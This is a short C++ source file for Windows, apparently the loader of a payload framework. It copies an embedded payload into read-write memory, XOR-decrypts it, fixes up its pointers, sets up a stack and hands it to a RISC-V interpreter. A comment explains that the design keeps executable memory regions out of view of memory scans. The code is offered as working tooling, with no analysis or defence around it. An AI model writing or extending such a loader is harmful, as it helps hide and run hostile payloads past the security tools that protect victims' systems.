#include "vm/loader.hpp"
#include "vm/config.hpp"
#include <cstring>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static void* alloc_rw(size_t sz) {
    // The payload is interpreted — the CPU never executes it — so plain RW
    // suffices and no RWX region ever appears in memory scans.
    return VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

void vm_xor_crypt(uint8_t* buf, size_t len);  // crypto.cpp

bool vm_load(RiscVm* vm, SyscallTable* sc) {
    size_t total = kPayloadSize + VM_STACK_SIZE;
    uint8_t* mem = (uint8_t*)alloc_rw(total);
    if (!mem) return false;

    // Decrypt payload into allocation
    memcpy(mem, kPayload, kPayloadSize);
    vm_xor_crypt(mem, kPayloadSize);

    // Fix up absolute 64-bit pointers embedded in the payload
    uint64_t base = (uint64_t)(uintptr_t)mem;
    for (size_t i = 0; i < kRelocCount; i++) {
        uint64_t* slot = (uint64_t*)(mem + kRelocOffsets[i]);
        *slot += base;
    }

    // Stack sits above the payload, sp at top aligned to 16
    uint64_t sp = (base + total) & ~(uint64_t)15;

    riscvm_init(vm, mem, total, sc);
    vm->pc       = base + kEntryOffset;
    vm->regs[RV_SP] = (int64_t)sp;
    return true;
}
